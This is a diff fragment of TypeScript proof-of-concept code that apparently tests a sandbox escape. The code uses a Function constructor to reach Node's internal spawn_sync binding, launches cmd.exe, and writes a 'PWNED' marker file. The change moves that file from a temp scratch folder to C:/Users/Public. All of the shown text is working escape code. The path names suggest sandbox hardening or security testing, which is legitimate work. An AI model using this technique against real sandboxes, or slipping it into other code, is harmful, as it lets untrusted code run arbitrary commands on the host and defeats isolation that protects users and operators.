@@ -9,7 +9,7 @@ try {
   const spawnSyncB: any = F('return process.binding("spawn_sync")')();
   const comspec: string = (proc.env && proc.env.ComSpec) || 'cmd.exe';
   const ret42: any = spawnSyncB.spawn({ file: comspec, args: ['/d','/s','/c','exit 42'], stdio: [ {type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true} ] });
-  const retFile: any = spawnSyncB.spawn({ file: comspec, args: ['/d','/s','/c','echo PWNED-SPAWNSYNC-ESCAPE> %TEMP%/aiw-scratch-escape/poc2c-proof.txt'], stdio: [ {type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true} ] });
+  const retFile: any = spawnSyncB.spawn({ file: comspec, args: ['/d','/s','/c','echo PWNED-SPAWNSYNC-ESCAPE> C:/Users/Public/aiw-poc2c-proof.txt'], stdio: [ {type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true} ] });
   r = 'EXIT42:' + ret42.status + ':FILEWRITE-STATUS:' + retFile.status;
 } catch (e) {
   r = 'blocked:' + (e as Error).name + ':' + String((e as Error).message ?? '').slice(0,140);
